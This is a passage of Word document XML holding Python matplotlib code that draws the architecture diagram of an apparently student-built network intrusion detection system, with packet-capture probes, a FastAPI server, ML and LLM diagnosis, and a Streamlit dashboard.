          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    group(ax, 8, 21, 144, 23, "边缘层  两台 PC 探针（scapy + 网卡混杂模式）", "edge")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="499A7B5B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    box(ax, 16, 23, 62, 16, "探针 A（PC-1，兼开发主机）",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="047631C7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "M1 实时抓包 · 多协议首部解析\nM2 会话聚合与统计特征（对齐 CIC 口径）", "edge")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69EAE54B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    box(ax, 82, 23, 62, 16, "探针 B（PC-2，兼攻击机）",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3562FBCA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "M1 抓包与解析（与 A 同构部署）\nM7 端口扫描 / SYN Flood / Ping Flood", "edge")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FD97E9D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60FC1FC1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    group(ax, 8, 52, 78, 29, "中心层  云服务器 · FastAPI", "center")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52B6C750">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    box(ax, 11, 65, 33, 12, "M6 上报接收与鉴权", "FastAPI 路由 · Token 校验", "center")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FA2081E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    box(ax, 49, 65, 33, 12, "SQLite 存储", "会话特征 / 告警 / 报告", "center")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D36E66B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    box(ax, 11, 52.5, 33, 11, "M3 小模型推理", "M8 对比 · M11 规则基线", "center")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BE6F108">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    box(ax, 49, 52.5, 33, 11, "M9 RAG 检索", "字符二元组 BM25 · 知识 Top-3", "center")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ACCED7D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="10C72F96">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    group(ax, 108, 52, 44, 29, "大模型层  商用 API", "llm")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0506551A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    box(ax, 111, 54, 38, 22, "M4 DeepSeek / 通义千问",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01303D9B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "HTTPS · OpenAI 兼容 SDK\n专家角色提示词\n固定输出 schema\n多轮追问", "llm")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="127B635E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6F5BF2CF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    box(ax, 8, 88, 144, 11, "M5 Streamlit 实时看板 · M10 双探针对比",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0362EDF5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "报文流水表 │ 协议占比与时序图 │ 攻击告警表 │ 诊断报告面板 │ 历史查询", "view")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="503DAC72">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4B7875C0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    arrow(ax, (40, 12), (40, 21))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58CEBE05">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    arrow(ax, (120, 12), (120, 21))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0298FD3D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ax.text(80, 16.2, "原始以太网帧", ha="center", va="center", fontsize=FS_NOTE,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="263EC09A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            color=GREY, zorder=5, bbox=dict(boxstyle="round,pad=0.3", fc="white", ec="none"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BBFA3AE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59CCF4C1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    arrow(ax, (32, 43), (32, 52), lw=1.7)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="561ABC76">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ax.text(30, 47.5, "① 会话特征 + 报文摘要\nHTTP/JSON · Token 鉴权",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52CC0238">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            ha="right", va="center", fontsize=FS_NOTE, color=GREY, zorder=5, linespacing=1.7,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7117C8D9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            bbox=dict(boxstyle="round,pad=0.3", fc="white", ec="none", alpha=0.96))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B7F80CE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    arrow(ax, (72, 52), (72, 43))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5503887F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ax.text(74, 47.5, "告警回执 /\n阈值配置下发",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D9695C1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            ha="left", va="center", fontsize=FS_NOTE, color=GREY, zorder=5, linespacing=1.7,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="715179CE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            bbox=dict(boxstyle="round,pad=0.3", fc="white", ec="none", alpha=0.96))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="771BD494">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="363318B8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    arrow(ax, (86, 72), (108, 72), lw=1.7)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09BA7F9A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ax.text(97, 76.5, "② 诊断请求\n（证据+知识）", ha="center", va="center",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4440F81B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            fontsize=FS_NOTE, color=GREY, zorder=5, linespacing=1.7,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15C4F4CA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            bbox=dict(boxstyle="round,pad=0.3", fc="white", ec="none", alpha=0.96))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AC5F8E3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    arrow(ax, (108, 61), (86, 61))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00C50F40">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ax.text(97, 57, "③ 诊断报告\n（JSON）", ha="center", va="center",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6655B713">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            fontsize=FS_NOTE, color=GREY, zorder=5, linespacing=1.7,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E6BCAE1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            bbox=dict(boxstyle="round,pad=0.3", fc="white", ec="none", alpha=0.96))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34EE91C7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6054D6AD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    arrow(ax, (60, 81), (60, 88), lw=1.7)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16DD7135">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ax.text(58, 84.5, "④ 告警与诊断报告实时推送（HTTP/WebSocket）",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A2EA2C1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            ha="right", va="center", fontsize=FS_NOTE, color=GREY, zorder=5, linespacing=1.7,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64CCD743">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            bbox=dict(boxstyle="round,pad=0.3", fc="white", ec="none", alpha=0.96))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79373154">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="25226CEB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fig.savefig(OUT / "fig1_architecture.png", dpi=300)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AC192FF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    plt.close(fig)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71A790FE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="24C81968">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2BE30207">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># ---------------------------------------------------------------- 图 2 小模型结构</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="477D76EA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def fig_ml_model():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BE0E50B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fig, ax = canvas()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EF03FF8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21401B50">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ax.text(4.5, 94, "（a）离线训练：一次性产出模型文件（models/train.py）",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C972395">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            ha="left", va="center", fontsize=10.2, color=INK, weight="bold")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44A68D43">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2FBBBDF7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    xs, w, gap, yb, hb = 4.5, 27.0, 4.0, 63, 24</w:t>
      </w:r>
